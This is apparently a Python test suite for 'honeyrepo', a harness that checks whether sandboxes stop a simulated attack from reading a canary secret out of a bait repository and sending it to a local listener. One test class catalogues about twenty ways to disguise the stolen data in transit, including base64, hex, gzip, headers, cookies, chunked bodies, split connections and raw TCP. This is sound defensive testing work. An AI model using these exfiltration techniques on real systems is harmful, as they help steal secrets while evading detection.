import json
import os
import shutil
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

import support
from support import DEMO_WRAPPER, IS_POSIX, IS_ROOT, PRELUDE, PYTHON, custom, emit, exfil

from honeyrepo import runner
from honeyrepo.listener import Listener
from honeyrepo.runner import REASON_CODES, AttackReport, attack_env, judge, parse_report, run_scripted
from honeyrepo.scenario import CONTROL_NAME, load

BLOCK = [PYTHON, str(DEMO_WRAPPER)]  # the demo wrapper: blocks Python's outgoing connections


def run(scenario=None, wrap=None, timeout=20.0):
    result = run_scripted(scenario or load("readme-exfil"), wrap=wrap, timeout=timeout)
    assert result.reason_code in REASON_CODES, result.reason_code
    assert REASON_CODES[result.reason_code] == result.verdict, result
    return result


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="honeyrepo-test-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)

    def assertVerdict(self, result, verdict, code):
        self.assertEqual((result.verdict, result.reason_code), (verdict, code), result.reason)


# --------------------------------------------------------------------------------------
# The basics: no sandbox, a network-blocking sandbox
# --------------------------------------------------------------------------------------
class BasicTests(Base):
    def test_unprotected_attack_leaks_the_canary(self):
        result = run()
        self.assertVerdict(result, "LEAKED", "canary-received")
        self.assertEqual(result.found_via, "plain")
        self.assertEqual(result.stages[-1], "send delivered (HTTP 200)")

    def test_blocked_network_holds_and_shows_where_it_stopped(self):
        result = run(wrap=BLOCK)
        self.assertVerdict(result, "HELD", "send-blocked")
        self.assertEqual(result.connections, 0)
        self.assertEqual(result.stages[:4], ["start", "control ok", "read ok", "send attempted"])
        self.assertIn("send blocked", result.stages[-1])

    def test_result_is_json_serialisable(self):
        data = json.loads(json.dumps(run().to_dict()))
        for key in ("scenario_id", "verdict", "reason_code", "reason", "stages", "connections", "found_via", "warnings"):
            self.assertIn(key, data)


# --------------------------------------------------------------------------------------
# Weakness A: HELD for reasons unrelated to protection
# --------------------------------------------------------------------------------------
@unittest.skipUnless(IS_POSIX, "needs POSIX `env`")
class WrongReasonTests(Base):
    def test_a_wrapper_that_changes_HOME_does_not_cause_a_false_HELD(self):
        for wrap in (["env", "HOME=/nonexistent"], ["env", "-u", "HOME"], ["env", "-i"]):
            with self.subTest(wrap):
                self.assertVerdict(run(wrap=wrap), "LEAKED", "canary-received")

    def test_the_real_home_folder_is_never_read(self):
        decoy_home = self.tmp / "realhome"
        decoy_home.mkdir()
        (decoy_home / ".env").write_text("REAL-SECRET-DO-NOT-READ\n")
        watcher = custom(
            PRELUDE
            + "import builtins\n"
            + "real_open = builtins.open\n"
            + f"touched = []\n"
            + "def spy(file, *a, **k):\n    touched.append(str(file))\n    return real_open(file, *a, **k)\n"
            + "builtins.open = spy\n"
            + "d = spy(os.environ['HONEYREPO_CANARY_FILE'], 'rb').read()\n"
            + f"real_open({str(self.tmp / 'touched.json')!r}, 'w').write(json.dumps(touched))\n"
            + f"os.environ.pop('HOME', None)\n"
            + "os.path.expanduser('~')\n"
        )
        with mock.patch.dict(os.environ, {"HOME": str(decoy_home), "USERPROFILE": str(decoy_home)}):
            run(watcher, wrap=["env", "-u", "HOME"])
        touched = json.loads((self.tmp / "touched.json").read_text())
        self.assertFalse(any("realhome" in path for path in touched), touched)

    def test_a_hidden_canary_is_HELD_only_because_the_control_file_was_still_readable(self):
        script = support.write_script(self.tmp, "hide.py", support.REMOVE_THEN_RUN)
        result = run(wrap=[PYTHON, script, "{home}/.env", "--"])
        self.assertVerdict(result, "HELD", "read-hidden")
        self.assertIn("control ok", result.stages)

    @unittest.skipIf(IS_ROOT, "root ignores file permissions")
    def test_a_permission_denied_canary_is_HELD_as_read_denied(self):
        script = support.write_script(self.tmp, "deny.py", support.DENY_THEN_RUN)
        self.assertVerdict(run(wrap=[PYTHON, script, "{home}/.env", "--"]), "HELD", "read-denied")

    def test_a_wrapper_that_hides_the_whole_repo_is_inconclusive_not_held(self):
        script = support.write_script(self.tmp, "hide.py", support.REMOVE_THEN_RUN)
        wrap = [PYTHON, script, "{home}/.env", "{repo}/" + CONTROL_NAME, "--"]
        self.assertVerdict(run(wrap=wrap), "INCONCLUSIVE", "control-unreadable")

    def test_a_blocked_network_with_a_broken_control_is_still_inconclusive(self):
        script = support.write_script(self.tmp, "hide.py", support.REMOVE_THEN_RUN)
        wrap = [PYTHON, script, "{repo}/" + CONTROL_NAME, "--", *BLOCK]
        self.assertVerdict(run(wrap=wrap), "INCONCLUSIVE", "control-unreadable")


# --------------------------------------------------------------------------------------
# Weakness B: the secret leaves, but not in a form a plain search finds
# --------------------------------------------------------------------------------------
class EncodedExfiltrationTests(Base):
    CASES = {
        "POST body": "c.request('POST', '/x', body=d)",
        "PUT": "c.request('PUT', '/x', body=d)",
        "PATCH": "c.request('PATCH', '/x', body=d)",
        "DELETE": "c.request('DELETE', '/x', body=d)",
        "unknown method": "c.request('EXFIL', '/x', body=d)",
        "query string": "c.request('GET', '/x?k=' + urllib.parse.quote(d.decode()))",
        "header": "c.request('GET', '/x', headers={'X-Data': d.decode().strip()})",
        "cookie": "c.request('GET', '/x', headers={'Cookie': 'k=' + d.decode().strip()})",
        "chunked": (
            "c.request('POST', '/x', body=iter([d[:7], d[7:20], d[20:]]), encode_chunked=True, "
            "headers={'Transfer-Encoding': 'chunked'})"
        ),
        "base64": "c.request('POST', '/x', body=base64.b64encode(d))",
        "urlsafe base64": "c.request('POST', '/x', body=base64.urlsafe_b64encode(d))",
        "base64 in json": "c.request('POST', '/x', body=json.dumps({'k': base64.b64encode(d).decode()}))",
        "base32": "c.request('POST', '/x', body=base64.b32encode(d))",
        "hex": "c.request('POST', '/x', body=d.hex())",
        "percent-encoded": "c.request('POST', '/x', body=''.join('%%%02x' % b for b in d))",
        "json unicode escapes": r"""c.request('POST', '/x', body='"' + ''.join('\\u%04x' % b for b in d) + '"')""",
        "gzip": "c.request('POST', '/x', body=gzip.compress(d), headers={'Content-Encoding': 'gzip'})",
        "zlib": "c.request('POST', '/x', body=zlib.compress(d))",
        "reversed": "c.request('POST', '/x', body=d[::-1])",
        "base64 inside percent-encoding": "c.request('POST', '/x', body=''.join('%%%02x' % b for b in base64.b64encode(d)))",
        "split over two connections": (
            "c.request('POST', '/a', body=d[:12]); c.getresponse().read(); c.close()\n"
            "c = http.client.HTTPConnection(u.hostname, u.port, timeout=5)\n"
            "c.request('POST', '/b', body=d[12:])"
        ),
        "raw TCP, not HTTP": "s = socket.create_connection((u.hostname, u.port), timeout=5); s.sendall(d); s.close()",
    }

    def test_every_disguise_is_LEAKED_not_HELD(self):
        for name, request in self.CASES.items():
            with self.subTest(name):
                tail = "" if "raw TCP" in name else "\nc.getresponse().read()"
                result = run(custom(exfil(request + tail)))
                self.assertVerdict(result, "LEAKED", "canary-received")
                self.assertIsNotNone(result.found_via)

    def test_traffic_that_cannot_be_explained_is_inconclusive_not_held(self):
        cases = {
            "a request without the canary": "c.request('POST', '/x', body=b'hello world')\nc.getresponse().read()",
            "a wrong canary": "c.request('POST', '/x', body=b'HONEYREPO-CANARY-ffffffffffffffff')\nc.getresponse().read()",
            "only the public prefix": "c.request('POST', '/x', body=b'HONEYREPO-CANARY-')\nc.getresponse().read()",
            "bytes that look like TLS": "s = socket.create_connection((u.hostname, u.port), timeout=5); s.sendall(bytes([22, 3, 1, 0, 200]) + os.urandom(200)); s.close()",
            "an encoding honeyrepo does not know": (
                "c.request('POST', '/x', body=bytes(b ^ 0x5a for b in d))\nc.getresponse().read()"
            ),
        }
        for name, code in cases.items():
            with self.subTest(name):
                self.assertVerdict(run(custom(exfil(code))), "INCONCLUSIVE", "unrecognised-request")

    def test_a_canary_beyond_the_size_cap_is_inconclusive_and_says_why(self):
        junk = "c.request('POST', '/x', body=b'A' * (1 << 20) + d)\nc.getresponse().read()"
        result = run(custom(exfil(junk)))
        self.assertVerdict(result, "INCONCLUSIVE", "unrecognised-request")
        self.assertIn("larger than 1 MiB", result.reason)

    def test_a_bare_connection_is_inconclusive(self):
        result = run(custom(exfil("socket.create_connection((u.hostname, u.port), timeout=5).close()")))
        self.assertVerdict(result, "INCONCLUSIVE", "connected-no-data")

    def test_the_control_file_text_is_not_mistaken_for_the_canary(self):
        code = exfil("c.request('POST', '/x', body=open(os.environ['HONEYREPO_CONTROL_FILE'], 'rb').read())\nc.getresponse().read()")
        self.assertVerdict(run(custom(code)), "INCONCLUSIVE", "unrecognised-request")


# --------------------------------------------------------------------------------------
# Scenario files that could never leak, and the time limit
# --------------------------------------------------------------------------------------
class ScenarioAndTimeoutTests(Base):
    def test_a_scenario_whose_secret_file_lacks_the_canary_cannot_be_loaded(self):
        from honeyrepo.scenario import ScenarioError

        with self.assertRaises(ScenarioError):
            custom("pass", template="API_KEY=static")

    def test_a_timeout_is_inconclusive_not_held(self):
        started = time.monotonic()
        result = run(custom(PRELUDE + emit(stage="start") + "time.sleep(60)"), timeout=1.5)
        self.assertVerdict(result, "INCONCLUSIVE", "timeout")
        self.assertLess(time.monotonic() - started, 15)

    @unittest.skipUnless(IS_POSIX and Path("/proc").exists(), "needs /proc")
    def test_a_timeout_also_stops_processes_the_attack_started(self):
        pidfile = self.tmp / "child.pid"
        child = f"import os, time; open({str(pidfile)!r}, 'w').write(str(os.getpid())); time.sleep(300)"
        code = (
            PRELUDE
            + f"subprocess.Popen([sys.executable, '-c', {child!r}])\n"
            + f"while not os.path.exists({str(pidfile)!r}): time.sleep(0.05)\n"
            + "time.sleep(300)\n"
        )
        self.assertVerdict(run(custom(code), timeout=2.5), "INCONCLUSIVE", "timeout")
        self.assertFalse(self._wait_dead(int(pidfile.read_text())), "the attack's child process survived the timeout")

    @unittest.skipUnless(IS_POSIX and Path("/proc").exists(), "needs /proc")
    def test_background_processes_are_stopped_even_without_a_timeout(self):
        pidfile = self.tmp / "bg.pid"
        child = f"import os, time; open({str(pidfile)!r}, 'w').write(str(os.getpid())); time.sleep(300)"
        code = (
            PRELUDE
            + f"subprocess.Popen([sys.executable, '-c', {child!r}], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
            + f"while not os.path.exists({str(pidfile)!r}): time.sleep(0.05)\n"
        )
        run(custom(code))
        self.assertFalse(self._wait_dead(int(pidfile.read_text())), "a background process survived the run")

    def _wait_dead(self, pid, seconds=5.0) -> bool:
        """Returns True if the process is STILL alive after waiting."""
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            if not support.process_is_alive(pid):
                return False
            time.sleep(0.1)
        return support.process_is_alive(pid)


# --------------------------------------------------------------------------------------
# Broken or misconfigured wrappers, crashes, unexpected termination
# --------------------------------------------------------------------------------------
class BrokenWrapperTests(Base):
    def test_a_wrapper_command_that_does_not_exist(self):
        self.assertVerdict(run(wrap=["definitely-not-a-real-command-xyz"]), "INCONCLUSIVE", "could-not-start")

    def test_a_wrapper_that_is_not_executable(self):
        path = self.tmp / "plain.txt"
        path.write_text("not a program")
        self.assertVerdict(run(wrap=[str(path)]), "INCONCLUSIVE", "could-not-start")

    def test_a_wrapper_that_exits_without_running_the_attack(self):
        for source in ("pass", "import sys; sys.exit(3)"):
            with self.subTest(source):
                self.assertVerdict(run(wrap=[PYTHON, "-c", source]), "INCONCLUSIVE", "not-started")

    def test_exit_code_is_reported(self):
        result = run(wrap=[PYTHON, "-c", "import sys; sys.exit(3)"])
        self.assertEqual(result.exit_code, 3)
        self.assertIn("exit code 3", result.reason)

    @unittest.skipUnless(IS_POSIX, "signals")
    def test_a_wrapper_killed_by_a_signal(self):
        result = run(wrap=[PYTHON, "-c", "import os, signal; os.kill(os.getpid(), signal.SIGKILL)"])
        self.assertVerdict(result, "INCONCLUSIVE", "not-started")
        self.assertEqual(result.signal, 9)

    @unittest.skipUnless(IS_POSIX, "needs POSIX sh")
    def test_a_wrapper_that_swallows_the_attacks_output_cannot_hide_a_leak(self):
        self.assertVerdict(run(wrap=["sh", "-c", '"$@" >/dev/null 2>&1', "sh"]), "LEAKED", "canary-received")

    @unittest.skipUnless(IS_POSIX, "needs POSIX sh")
    def test_a_wrapper_that_swallows_output_and_blocks_is_inconclusive(self):
        wrap = ["sh", "-c", '"$@" >/dev/null 2>&1', "sh", *BLOCK]
        self.assertVerdict(run(wrap=wrap), "INCONCLUSIVE", "not-started")

    @unittest.skipUnless(IS_POSIX, "needs POSIX sh")
    def test_a_wrapper_that_floods_its_output_does_not_break_the_run(self):
        flood = "import sys; sys.stdout.write('x' * 30_000_000); sys.stderr.write('y' * 30_000_000); sys.stdout.flush()"
        script = support.write_script(self.tmp, "flood.py", flood + "\nimport subprocess; sys.exit(subprocess.call(sys.argv[1:]))\n")
        started = time.monotonic()
        result = run(wrap=[PYTHON, script])
        self.assertVerdict(result, "LEAKED", "canary-received")
        self.assertLess(time.monotonic() - started, 30)
        self.assertLessEqual(len(result.stderr_tail), 2000)

    @unittest.skipUnless(IS_POSIX, "needs POSIX processes")
    def test_a_background_process_holding_the_output_open_is_not_a_timeout(self):
        code = (
            exfil("c.request('POST', '/x', body=d)\nc.getresponse().read()")
            + "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(300)'])\n"  # inherits stdout and stderr
        )
        started = time.monotonic()
        self.assertVerdict(run(custom(code), timeout=20), "LEAKED", "canary-received")
        self.assertLess(time.monotonic() - started, 12)

    @unittest.skipUnless(IS_POSIX and Path("/proc").exists(), "needs /proc")
    def test_a_process_that_leaves_the_process_group_is_a_known_limit_and_gives_a_warning(self):
        # Documented in the threat model (limit 7): honeyrepo cannot stop what escaped its group,
        # but it must not hang, must still judge the run, and must say that output was cut off.
        pidfile = self.tmp / "escapee.pid"
        child = f"import os, time; open({str(pidfile)!r}, 'w').write(str(os.getpid())); time.sleep(300)"
        code = (
            exfil("c.request('POST', '/x', body=d)\nc.getresponse().read()")
            + f"subprocess.Popen([sys.executable, '-c', {child!r}], start_new_session=True)\n"
            + f"while not os.path.exists({str(pidfile)!r}): time.sleep(0.05)\n"
        )
        started = time.monotonic()
        try:
            result = run(custom(code), timeout=20)
            self.assertVerdict(result, "LEAKED", "canary-received")
            self.assertTrue(any("kept it open" in w for w in result.warnings), result.warnings)
            self.assertLess(time.monotonic() - started, 12)
        finally:
            if pidfile.exists():
                try:
                    os.kill(int(pidfile.read_text()), 9)
                except (OSError, ValueError):
                    pass

    def test_the_expanded_wrapper_is_reported_for_reproducibility(self):
        result = run(wrap=[PYTHON, "-c", "import sys; sys.exit(3)", "{repo}"])
        self.assertEqual(result.wrapper[0], PYTHON)
        self.assertTrue(result.wrapper[-1].endswith("repo"))
        self.assertNotIn("{repo}", " ".join(result.wrapper))
        self.assertEqual(run().wrapper, [])

    def test_wrap_placeholders_expand_to_the_bait_folders(self):
        checker = (
            "import os, subprocess, sys\n"
            "repo, home, *command = sys.argv[1:]\n"
            "assert os.path.isfile(os.path.join(repo, 'README.md')), 'repo placeholder is wrong'\n"
            f"assert os.path.isfile(os.path.join(repo, {CONTROL_NAME!r})), 'control file is missing'\n"
            "assert os.path.isfile(os.path.join(home, '.env')), 'home placeholder is wrong'\n"
            "sys.exit(subprocess.call(command))\n"
        )
        self.assertVerdict(run(wrap=["{python}", "-c", checker, "{repo}", "{home}"]), "LEAKED", "canary-received")

    def test_stdin_is_closed_so_a_wrapper_cannot_hang_waiting_for_input(self):
        import subprocess

        scenario = self.tmp / "stdin.toml"
        code = exfil("sys.stdin.read()\nc.request('POST', '/x', body=d)\nc.getresponse().read()")
        scenario.write_text(
            'id = "stdin"\ntitle = "t"\n[bait.files]\n"README.md" = "x"\n'
            '[canary]\npath = ".env"\ntemplate = "{canary}"\n'
            f'[attack]\ncommand = ["{{python}}", "-c", {json.dumps(code)}]\n'
        )
        env = dict(os.environ, PYTHONPATH=str(support.SRC.parent))
        proc = subprocess.Popen(
            [PYTHON, "-m", "honeyrepo", "run", str(scenario), "--timeout", "20"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env,
        )
        try:
            started = time.monotonic()
            proc.wait(timeout=30)
            self.assertLess(time.monotonic() - started, 15)
            self.assertEqual(proc.returncode, 1)  # LEAKED, not a hang
        finally:
            proc.kill()
            proc.stdin.close()
            proc.stdout.close()
            proc.stderr.close()


class AttackCrashTests(Base):
    START = PRELUDE + emit(stage="start")
    CONTROL = emit(stage="control", ok=True)
    READ = emit(stage="read", ok=True)
    ATTEMPT = emit(stage="send", outcome="attempt")

    def test_a_crash_before_the_first_check(self):
        result = run(custom(self.START + "raise RuntimeError('boom')"))
        self.assertVerdict(result, "INCONCLUSIVE", "attack-crashed")
        self.assertIn("boom", result.stderr_tail)

    def test_a_crash_before_reading_the_canary(self):
        self.assertVerdict(run(custom(self.START + self.CONTROL + "sys.exit(0)")), "INCONCLUSIVE", "attack-crashed")

    def test_a_crash_after_reading_but_before_sending(self):
        self.assertVerdict(run(custom(self.START + self.CONTROL + self.READ + "sys.exit(1)")), "INCONCLUSIVE", "attack-crashed")

    def test_a_crash_while_sending(self):
        code = self.START + self.CONTROL + self.READ + self.ATTEMPT + "raise KeyError('x')"
        self.assertVerdict(run(custom(code)), "INCONCLUSIVE", "attack-crashed")

    def test_an_unexpected_read_error_is_inconclusive(self):
        code = self.START + self.CONTROL + emit(stage="read", ok=False, kind="other", error="IsADirectoryError")
        self.assertVerdict(run(custom(code)), "INCONCLUSIVE", "read-error")

    def test_a_send_error_that_does_not_prove_blocking_is_inconclusive(self):
        code = self.START + self.CONTROL + self.READ + self.ATTEMPT + emit(stage="send", outcome="error", error="MemoryError")
        self.assertVerdict(run(custom(code)), "INCONCLUSIVE", "send-error")

    def test_an_answer_from_something_other_than_the_listener(self):
        code = self.START + self.CONTROL + self.READ + self.ATTEMPT + emit(stage="send", outcome="answered-by-other", status=403)
        self.assertVerdict(run(custom(code)), "INCONCLUSIVE", "answered-by-other")

    def test_a_claim_of_delivery_that_the_listener_never_saw_is_not_trusted(self):
        code = self.START + self.CONTROL + self.READ + self.ATTEMPT + emit(stage="send", outcome="delivered", status=200)
        self.assertVerdict(run(custom(code)), "INCONCLUSIVE", "inconsistent-report")

    def test_a_custom_attack_that_reports_nothing_can_leak_but_never_hold(self):
        self.assertVerdict(run(custom("pass")), "INCONCLUSIVE", "no-stage-report")
        self.assertVerdict(run(custom(exfil("c.request('POST','/x',body=d)\nc.getresponse().read()"))), "LEAKED", "canary-received")

    def test_a_custom_attack_that_follows_the_protocol_can_hold(self):
        code = self.START + self.CONTROL + self.READ + self.ATTEMPT + emit(stage="send", outcome="blocked", error="ConnectionRefusedError")
        self.assertVerdict(run(custom(code)), "HELD", "send-blocked")

    @unittest.skipUnless(IS_POSIX, "signals")
    def test_killed_while_sending_is_suspected_protection_but_inconclusive(self):
        code = self.START + self.CONTROL + self.READ + self.ATTEMPT + "import signal; os.kill(os.getpid(), signal.SIGKILL)"
        result = run(custom(code))
        self.assertVerdict(result, "INCONCLUSIVE", "killed-at-send")
        self.assertEqual(result.signal, 9)

    def test_stage_lines_with_garbage_are_ignored(self):
        report = parse_report(
            "HONEYREPO-STAGE not json\nHONEYREPO-STAGE [1,2]\nrandom\n"
            'HONEYREPO-STAGE {"stage": "start"}\nHONEYREPO-STAGE {"stage": "nonsense"}\n'
        )
        self.assertEqual((report.started, report.control, report.read), (True, None, None))


# --------------------------------------------------------------------------------------
# Listener failures
# --------------------------------------------------------------------------------------
class ListenerFailureTests(Base):
    def test_a_listener_that_cannot_start(self):
        with mock.patch.object(Listener, "start", side_effect=OSError("no ports left")):
            self.assertVerdict(run(), "INCONCLUSIVE", "listener-failed")

    def test_a_listener_that_cannot_confirm_it_saw_everything_is_not_trusted(self):
        with mock.patch.object(Listener, "settle", return_value=False):
            self.assertVerdict(run(wrap=BLOCK), "INCONCLUSIVE", "listener-error")

    def test_a_listener_handler_error_is_not_read_as_silence(self):
        with mock.patch.object(Listener, "_serve", side_effect=RuntimeError("handler broke")):
            self.assertVerdict(run(), "INCONCLUSIVE", "listener-error")

    def test_a_listener_that_died_does_not_make_a_refused_connection_look_like_protection(self):
        # If the listener is gone, "connection refused" says nothing about the sandbox.
        original = Listener.start

        def start_then_die(listener):
            original(listener)
            listener._server.shutdown()
            listener._server.server_close()
            return listener

        with mock.patch.object(Listener, "start", start_then_die):
            result = run()
        self.assertVerdict(result, "INCONCLUSIVE", "listener-error")
        self.assertIn("send blocked", result.stages[-1])  # the attack itself saw a refusal

    def test_a_thread_that_cannot_start_is_reported_not_raised(self):
        with mock.patch("honeyrepo.listener.threading.Thread.start", side_effect=RuntimeError("can't start new thread")):
            self.assertVerdict(run(), "INCONCLUSIVE", "listener-failed")

    def test_a_leak_is_still_reported_if_the_listener_misbehaves_afterwards(self):
        with mock.patch.object(Listener, "settle", return_value=False):
            self.assertVerdict(run(), "LEAKED", "canary-received")


# --------------------------------------------------------------------------------------
# Cleanup and isolation
# --------------------------------------------------------------------------------------
class CleanupTests(Base):
    def leftovers(self, **kwargs):
        scratch = self.tmp / "scratch"
        scratch.mkdir(exist_ok=True)
        with mock.patch.object(tempfile, "tempdir", str(scratch)):
            result = run(**kwargs)
        return result, [p.name for p in scratch.iterdir()]

    def test_nothing_is_left_behind_after_any_outcome(self):
        cases = {
            "leaked": {},
            "held": {"wrap": BLOCK},
            "could not start": {"wrap": ["definitely-not-a-real-command-xyz"]},
            "timeout": {"scenario": custom(PRELUDE + "time.sleep(60)"), "timeout": 1.0},
            "crash": {"scenario": custom("raise SystemExit(7)")},
        }
        for name, kwargs in cases.items():
            with self.subTest(name):
                result, left = self.leftovers(**kwargs)
                self.assertEqual(left, [], result)

    @unittest.skipUnless(Path("/proc/self/fd").exists(), "needs /proc")
    def test_runs_do_not_leak_file_descriptors_or_threads(self):
        import threading

        def count():
            return len(os.listdir("/proc/self/fd")), threading.active_count()

        run()  # warm up lazily created things
        before = count()
        for kwargs in ({}, {"wrap": BLOCK}, {"wrap": ["definitely-not-a-real-command-xyz"]}, {"scenario": custom("pass")}):
            run(**kwargs)
        self.assertEqual(count(), before)

    def test_nothing_is_left_behind_when_setup_or_the_listener_fails(self):
        with mock.patch.object(Listener, "start", side_effect=OSError("no ports left")):
            _, left = self.leftovers()
        self.assertEqual(left, [])

    def test_read_only_directories_left_by_the_attack_are_still_removed(self):
        code = "import os; os.makedirs('cache/sub'); open('cache/sub/f', 'w').close(); os.chmod('cache/sub', 0o500)"
        _, left = self.leftovers(scenario=custom(code))
        self.assertEqual(left, [])

    def test_cleanup_failure_is_a_warning_not_a_crash_and_does_not_change_the_verdict(self):
        scratch = self.tmp / "scratch2"
        scratch.mkdir()
        with mock.patch.object(tempfile, "tempdir", str(scratch)), mock.patch.object(
            runner.shutil, "rmtree", side_effect=PermissionError("locked")
        ):
            result = run(wrap=BLOCK)
        self.assertVerdict(result, "HELD", "send-blocked")
        self.assertTrue(any("could not delete" in warning for warning in result.warnings), result.warnings)

    def test_an_interrupt_still_cleans_up(self):
        scratch = self.tmp / "scratch3"
        scratch.mkdir()
        with mock.patch.object(tempfile, "tempdir", str(scratch)), mock.patch.object(
            runner.detect, "find_canary", side_effect=KeyboardInterrupt
        ):
            with self.assertRaises(KeyboardInterrupt):
                run_scripted(load("readme-exfil"))
        self.assertEqual(list(scratch.iterdir()), [])


class IsolationTests(Base):
    def test_real_environment_variables_do_not_reach_the_attack(self):
        dump = self.tmp / "env.json"
        code = f"import os, json; open({str(dump)!r}, 'w').write(json.dumps({{'env': dict(os.environ), 'cwd': os.listdir('.')}}))"
        with mock.patch.dict(os.environ, {"MY_API_KEY": "do-not-leak", "HTTPS_PROXY": "http://x", "AWS_SECRET_ACCESS_KEY": "s"}):
            run(custom(code))
        seen = json.loads(dump.read_text())
        for name in ("MY_API_KEY", "HTTPS_PROXY", "AWS_SECRET_ACCESS_KEY"):
            self.assertNotIn(name, seen["env"])
        self.assertIn("honeyrepo-", seen["env"]["HOME"])
        self.assertTrue(seen["env"]["HONEYREPO_LISTENER"].startswith("http://127.0.0.1:"))
        self.assertIn("README.md", seen["cwd"])  # the attack starts inside the bait repo
        self.assertIn(CONTROL_NAME, seen["cwd"])

    @unittest.skipIf(sys.platform == "win32", "symlinks need privileges on Windows")
    def test_paths_given_to_the_sandbox_are_resolved_not_symlinks(self):
        real = self.tmp / "real"
        real.mkdir()
        link = self.tmp / "link"
        link.symlink_to(real, target_is_directory=True)
        dump = self.tmp / "paths.json"
        code = (
            "import os, json\n"
            f"open({str(dump)!r}, 'w').write(json.dumps([os.environ['HONEYREPO_CANARY_FILE'], os.environ['HONEYREPO_CONTROL_FILE'], os.getcwd()]))"
        )
        with mock.patch.object(tempfile, "tempdir", str(link)):
            run(custom(code))
        for path in json.loads(dump.read_text()):
            self.assertEqual(path, os.path.realpath(path))
            self.assertNotIn("link", path)

    def test_attack_env_helper(self):
        with mock.patch.dict(os.environ, {"MY_API_KEY": "x"}):
            env = attack_env(Path("home"), "http://127.0.0.1:1")
        self.assertNotIn("MY_API_KEY", env)
        self.assertEqual(env["HONEYREPO_LISTENER"], "http://127.0.0.1:1")
        self.assertNotIn("HONEYREPO_CANARY_FILE", env)

    def test_the_canary_is_not_visible_in_the_environment_or_arguments(self):
        dump = self.tmp / "seen.json"
        code = f"import os, sys, json; open({str(dump)!r}, 'w').write(json.dumps([dict(os.environ), sys.argv]))"
        run(custom(code))
        self.assertNotIn("HONEYREPO-CANARY-", dump.read_text())

    def test_each_run_uses_a_fresh_canary(self):
        dump = self.tmp / "canary.txt"
        code = f"d = open(os.environ['HONEYREPO_CANARY_FILE']).read(); open({str(dump)!r}, 'a').write(d)"
        run(custom("import os\n" + code))
        run(custom("import os\n" + code))
        lines = [line for line in dump.read_text().splitlines() if line]
        self.assertEqual(len(set(lines)), 2)
        for line in lines:
            self.assertRegex(line, r"^API_KEY=HONEYREPO-CANARY-[0-9a-f]{16}$")

    def test_unverified_platforms_get_a_warning_and_linux_does_not(self):
        for platform in ("win32", "darwin", "freebsd14"):
            with self.subTest(platform):
                note = runner.platform_warning(platform)
                self.assertIn("only been verified on Linux", note)
                self.assertIn(platform, note)
        self.assertIsNone(runner.platform_warning("linux"))
        if sys.platform.startswith("linux"):
            self.assertEqual(run().warnings, [])

    def test_the_platform_warning_reaches_the_result(self):
        with mock.patch.object(runner, "platform_warning", return_value="untested here"):
            self.assertIn("untested here", run().warnings)

    def test_invalid_timeouts_are_refused(self):
        for bad in (0, -1, float("nan"), float("inf"), "5", None):
            with self.subTest(bad):
                with self.assertRaises(ValueError):
                    run_scripted(load("readme-exfil"), timeout=bad)


# --------------------------------------------------------------------------------------
# The judge, as a pure function
# --------------------------------------------------------------------------------------
class JudgeTests(unittest.TestCase):
    def verdict(self, report=None, **overrides):
        args = dict(
            found_via=None, connections=[], listener_errors=[], timed_out=False, timeout=30.0,
            exit_code=0, signal_number=None, builtin_attack=True,
        )
        args.update(overrides)
        return judge(report or AttackReport(), **args)

    def full_report(self, **send):
        return AttackReport(
            started=True, control={"ok": True}, read={"ok": True}, send_attempted=True,
            send={"outcome": "blocked", "error": "ConnectionRefusedError", **send},
        )

    def test_an_empty_report_is_never_held(self):
        self.assertEqual(self.verdict().verdict, "INCONCLUSIVE")

    def test_a_complete_blocked_report_is_held(self):
        self.assertEqual(self.verdict(self.full_report()).verdict, "HELD")

    def test_leaked_wins_over_everything_else(self):
        self.assertEqual(self.verdict(found_via="plain", timed_out=True, listener_errors=["x"]).verdict, "LEAKED")

    def test_evidence_that_traffic_arrived_overrides_a_blocked_report(self):
        from honeyrepo.listener import Connection

        report = self.full_report()
        self.assertEqual(self.verdict(report, connections=[Connection(b"x")]).code, "unrecognised-request")
        self.assertEqual(self.verdict(report, connections=[Connection(b"")]).code, "connected-no-data")
        self.assertEqual(self.verdict(report, listener_errors=["boom"]).code, "listener-error")
        self.assertEqual(self.verdict(report, timed_out=True).code, "timeout")

    def test_every_reason_code_is_documented_and_consistent(self):
        text = (support.ROOT / "docs" / "verdicts.md").read_text(encoding="utf-8")
        for code, verdict in REASON_CODES.items():
            self.assertIn(f"`{code}`", text, f"{code} is missing from docs/verdicts.md")
            self.assertIn(verdict, ("LEAKED", "HELD", "INCONCLUSIVE"))


if __name__ == "__main__":
    unittest.main()
